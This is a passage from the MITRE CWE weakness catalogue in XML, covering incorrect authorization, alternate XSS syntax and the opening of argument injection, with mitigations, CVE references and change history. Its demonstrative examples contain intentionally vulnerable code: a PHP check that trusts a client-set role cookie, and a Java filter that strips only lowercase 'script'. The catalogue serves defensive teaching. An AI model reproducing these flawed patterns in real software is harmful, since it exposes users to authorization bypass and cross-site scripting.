               <Effectiveness>Moderate</Effectiveness>
               <Effectiveness_Notes>These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules. However, manual efforts might not achieve desired code coverage within limited time constraints.</Effectiveness_Notes>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Binary / Bytecode disassembler - then use manual analysis for vulnerabilities &amp; anomalies</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Automated Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Web Application Scanner</xhtml:li>
                           <xhtml:li>Web Services Scanner</xhtml:li>
                           <xhtml:li>Database Scanners</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Manual Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Host Application Interface Scanner</xhtml:li>
                           <xhtml:li>Fuzz Tester</xhtml:li>
                           <xhtml:li>Framework-based Fuzzer</xhtml:li>
                           <xhtml:li>Forced Path Execution</xhtml:li>
                           <xhtml:li>Monitored Virtual Environment - run potentially malicious code in sandbox / wrapper / virtual machine, see if it does anything suspicious</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Focused Manual Spotcheck - Focused manual analysis of source</xhtml:li>
                           <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Formal Methods / Correct-By-Construction</xhtml:li>
                        </xhtml:ul>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>
                  <xhtml:p>Divide the product into anonymous, normal, privileged, and administrative areas. Reduce the attack surface by carefully mapping roles with data and functionality. Use role-based access control (RBAC) [REF-229] to enforce the roles at the appropriate boundaries.</xhtml:p>
                  <xhtml:p>Note that this approach may not protect against horizontal authorization, i.e., it will not protect a user from attacking others with the same role.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Ensure that access control checks are performed related to the business logic. These checks may be different than the access control checks that are applied to more generic resources such as files, connections, processes, memory, and database records. For example, a database may restrict access for medical records to a specific database user, but each record might only be intended to be accessible to the patient and the patient's doctor [REF-7].</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-4.4">
               <Phase>Architecture and Design</Phase>
               <Strategy>Libraries or Frameworks</Strategy>
               <Description>
                  <xhtml:p>Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.</xhtml:p>
                  <xhtml:p>For example, consider using authorization frameworks such as the JAAS Authorization Framework [REF-233] and the OWASP ESAPI Access Control feature [REF-45].</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>
                  <xhtml:p>For web applications, make sure that the access control mechanism is enforced correctly at the server side on every page. Users should not be able to access any unauthorized functionality or information by simply requesting direct access to that page.</xhtml:p>
                  <xhtml:p>One way to do this is to ensure that all pages containing sensitive information are not cached, and that all such pages restrict access to requests that are accompanied by an active and authenticated session token associated with a user who has the required permissions to access that page.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>System Configuration</Phase>
               <Phase>Installation</Phase>
               <Description>Use the access control capabilities of your operating system and server environment and define your access control lists accordingly. Use a "default deny" policy when defining these ACLs.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The following code could be for a medical records application. It displays a record to already authenticated users, confirming the user's authorization using a value stored in a cookie.</Intro_Text>
               <Example_Code Nature="Bad" Language="PHP">
                  <xhtml:div>$role = $_COOKIES['role'];<xhtml:br/>if (!$role) {<xhtml:div style="margin-left:1em;">$role = getRole('user');<xhtml:br/>if ($role) {<xhtml:div style="margin-left:1em;">// save the cookie to send out in future responses<xhtml:br/>setcookie("role", $role, time()+60*60*2);</xhtml:div>}<xhtml:br/>else{<xhtml:div style="margin-left:1em;">ShowLoginScreen();<xhtml:br/>die("\n");</xhtml:div>}</xhtml:div>}<xhtml:br/>if ($role == 'Reader') {<xhtml:div style="margin-left:1em;">DisplayMedicalHistory($_POST['patient_ID']);</xhtml:div>}<xhtml:br/>else{<xhtml:div style="margin-left:1em;">die("You are not Authorized to view this record\n");</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>The programmer expects that the cookie will only be set when getRole() succeeds. The programmer even diligently specifies a 2-hour expiration for the cookie. However, the attacker can easily set the "role" cookie to the value "Reader". As a result, the $role variable is "Reader", and getRole() is never invoked. The attacker has bypassed the authorization system.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2021-39155</Reference>
               <Description>Chain: A microservice integration and management platform compares the hostname in the HTTP Host header in a case-sensitive way (CWE-178, CWE-1289), allowing bypass of the authorization policy (CWE-863) using a hostname with mixed case or other variations.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-39155</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2019-15900</Reference>
               <Description>Chain: sscanf() call is used to check if a username and group exists, but the return value of sscanf() call is not checked (CWE-252), causing an uninitialized variable to be checked (CWE-457), returning success to allow authorization bypass for executing a privileged (CWE-863).</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2019-15900</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-2213</Reference>
               <Description>Gateway uses default "Allow" configuration for its authorization settings.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-2213</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-0034</Reference>
               <Description>Chain: product does not properly interpret a configuration option for a system group, allowing users to gain privileges.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-0034</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-6123</Reference>
               <Description>Chain: SNMP product does not properly parse a configuration option for which hosts are allowed to connect, allowing unauthorized IP addresses to connect.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-6123</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-7109</Reference>
               <Description>Chain: reliance on client-side security (CWE-602) allows attackers to bypass authorization using a custom client.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-7109</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-3424</Reference>
               <Description>Chain: product does not properly handle wildcards in an authorization policy list, allowing unintended access.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-3424</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-4577</Reference>
               <Description>ACL-based protection mechanism treats negative access rights as if they are positive, allowing bypass of intended restrictions.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-4577</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-6679</Reference>
               <Description>Product relies on the X-Forwarded-For HTTP header for authorization, allowing unintended access by spoofing the header.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2006-6679</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2801</Reference>
               <Description>Chain: file-system code performs an incorrect comparison (CWE-697), preventing default ACLs from being properly applied.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2801</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-1155</Reference>
               <Description>Chain: product does not properly check the result of a reverse DNS lookup because of operator precedence (CWE-783), allowing bypass of DNS-based access restrictions.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-1155</Link>
            </Observed_Example>
         </Observed_Examples>
         <References>
            <Reference External_Reference_ID="REF-229"/>
            <Reference External_Reference_ID="REF-7" Section="Chapter 4, &#34;Authorization&#34; Page 114; Chapter 6, &#34;Determining&#xA;                  Appropriate Access Control&#34; Page 171"/>
            <Reference External_Reference_ID="REF-231"/>
            <Reference External_Reference_ID="REF-233"/>
            <Reference External_Reference_ID="REF-45"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 2, &#34;Common Vulnerabilities of Authorization&#34;, Page 39"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2011-05-24</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Description</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Modes_of_Introduction, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated References</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Alternate_Terms</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description, Potential_Mitigations</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="87" Name="Improper Neutralization of Alternate XSS Syntax" Abstraction="Variant" Structure="Simple" Status="Draft">
         <Description>The product does not neutralize or incorrectly neutralizes user-controlled input for alternate script syntax.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="79" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Read Application Data</Impact>
               <Impact>Execute Unauthorized Code or Commands</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Resolve all input to absolute or canonical representations before processing.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Carefully check each input parameter against a rigorous positive specification (allowlist) defining the specific characters and format allowed. All input should be neutralized, not just parameters that the user is supposed to specify, but all data in the request, including tag attributes, hidden fields, cookies, headers, the URL itself, and so forth. A common mistake that leads to continuing XSS vulnerabilities is to validate only fields that are expected to be redisplayed by the site. We often encounter data from the request that is reflected by the application server or the application that the development team did not anticipate. Also, a field that is not currently reflected may be used by a future developer. Therefore, validating ALL parts of the HTTP request is recommended.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-30.1">
               <Phase>Implementation</Phase>
               <Strategy>Output Encoding</Strategy>
               <Description>
                  <xhtml:p>Use and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component.</xhtml:p>
                  <xhtml:p>The problem of inconsistent output encodings often arises in web pages. If an encoding is not specified in an HTTP header, web browsers often guess about which encoding is being used. This can open up the browser to subtle XSS attacks.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-43">
               <Phase>Implementation</Phase>
               <Description>With Struts, write all data from form beans with the bean's filter attribute set to true.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-31">
               <Phase>Implementation</Phase>
               <Strategy>Attack Surface Reduction</Strategy>
               <Description>To help mitigate XSS attacks against the user's session cookie, set the session cookie to be HttpOnly. In browsers that support the HttpOnly feature (such as more recent versions of Internet Explorer and Firefox), this attribute can prevent the user's session cookie from being accessible to malicious client-side scripts that use document.cookie. This is not a complete solution, since HttpOnly is not supported by all browsers. More importantly, XMLHTTPRequest and other powerful browser technologies provide read access to HTTP headers, including the Set-Cookie header in which the HttpOnly flag is set.</Description>
               <Effectiveness>Defense in Depth</Effectiveness>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-141">
               <Intro_Text>In the following example, an XSS neutralization method intends to replace script tags in user-supplied input with a safe equivalent:</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>public String preventXSS(String input, String mask) {<xhtml:div style="margin-left:1em;">return input.replaceAll("script", mask);</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>The code only works when the "script" tag is in all lower-case, forming an incomplete denylist (CWE-184). Equivalent tags such as "SCRIPT" or "ScRiPt" will not be neutralized by this method, allowing an XSS attack.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2002-0738</Reference>
               <Description>XSS using "&amp;={script}".</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-0738</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Alternate XSS syntax</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP24</Entry_ID>
               <Entry_Name>Tainted input to command</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="199"/>
         </Related_Attack_Patterns>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Sean Eidemiller</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>added/updated demonstrative examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Name, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Description, Name, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-05-03</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-09-09">Alternate XSS Syntax</Previous_Entry_Name>
            <Previous_Entry_Name Date="2010-06-21">Failure to Sanitize Alternate XSS Syntax</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="88" Name="Improper Neutralization of Argument Delimiters in a Command ('Argument Injection')" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The product constructs a string for a command to executed by a separate component
in another control sphere, but it does not properly delimit the
intended arguments, options, or switches within that command string.</Description>
         <Extended_Description>
            <xhtml:p>When creating commands using interpolation into a string, developers may assume that only the arguments/options that they specify will be processed.  This assumption may be even stronger when the programmer has encoded the command in a way that prevents separate commands from being provided maliciously, e.g. in the case of shell metacharacters.  When constructing the command, the developer may use whitespace or other delimiters that are required to separate arguments when the command. However, if an attacker can provide an untrusted input that contains argument-separating delimiters, then the resulting command will have more arguments than intended by the developer.  The attacker may then be able to change the behavior of the command.  Depending on the functionality supported by the extraneous arguments, this may have security-relevant consequences.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
             <Related_Weakness Nature="ChildOf" CWE_ID="77" View_ID="1000" Ordinal="Primary"/>
             <Related_Weakness Nature="ChildOf" CWE_ID="74" View_ID="1003" Ordinal="Primary"/>
             <Related_Weakness Nature="ChildOf" CWE_ID="77" View_ID="1305" Ordinal="Primary"/>
			 <Related_Weakness Nature="ChildOf" CWE_ID="77" View_ID="1340" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
            <Language Name="PHP" Prevalence="Often"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Scope>Other</Scope>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Impact>Alter Execution Logic</Impact>
               <Impact>Read Application Data</Impact>
               <Impact>Modify Application Data</Impact>
               <Note>An attacker could include arguments that allow unintended commands or code to be executed, allow sensitive data to be read or modified or could cause other unintended behavior.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Strategy>Parameterization</Strategy>
               <Description>Where possible, avoid building a single string that contains the command and its arguments.  Some languages or frameworks have functions that support specifying independent arguments, e.g. as an array, which is used to automatically perform the appropriate quoting or escaping while building the command.  For example, in PHP, escapeshellarg() can be used to escape a single argument to system(), or exec() can be called with an array of arguments.  In C, code can often be refactored from using system() - which accepts a single string - to using exec(), which requires separate function arguments for each parameter.</Description>
	       <Effectiveness>High</Effectiveness>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>Understand all the potential areas where untrusted inputs can enter your product: parameters or arguments, cookies, anything read from the network, environment variables, request headers as well as content, URL components, e-mail, files, databases, and any external systems that provide data to the application. Perform input validation at well-defined interfaces.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-5">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs.  This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Directly convert your input type into the expected data type, such as using a conversion function that translates a string into a number. After converting to the expected data type, ensure that the input's values fall within the expected range of allowable values and that multi-field consistencies are maintained.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>
                  <xhtml:p>Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180, CWE-181). Make sure that your application does not inadvertently decode the same input twice (CWE-174). Such errors could be used to bypass allowlist schemes by introducing dangerous inputs after they have been checked. Use libraries such as the OWASP ESAPI Canonicalization control.</xhtml:p>
                  <xhtml:p>Consider performing repeated canonicalization until your input does not change any more. This will avoid double-decoding and similar scenarios, but it might inadvertently modify inputs that are allowed to contain properly-encoded dangerous content.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>When exchanging data between components, ensure that both components are using the same character encoding. Ensure that the proper encoding is applied at each interface. Explicitly set the encoding you are using whenever the protocol allows you to do so.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>When your application combines data from multiple sources, perform the validation after the sources have been combined. The individual data elements may pass the validation step but violate the intended restrictions after they have been combined.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Testing</Phase>
               <Description>Use automated static analysis tools that target this type of weakness. Many modern techniques use data flow analysis to minimize the number of false positives. This is not a perfect solution, since 100% accuracy and coverage are not feasible.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Testing</Phase>
               <Description>Use dynamic tools and techniques that interact with the product using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The product's operation may slow down, but it should not become unstable, crash, or generate incorrect results.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
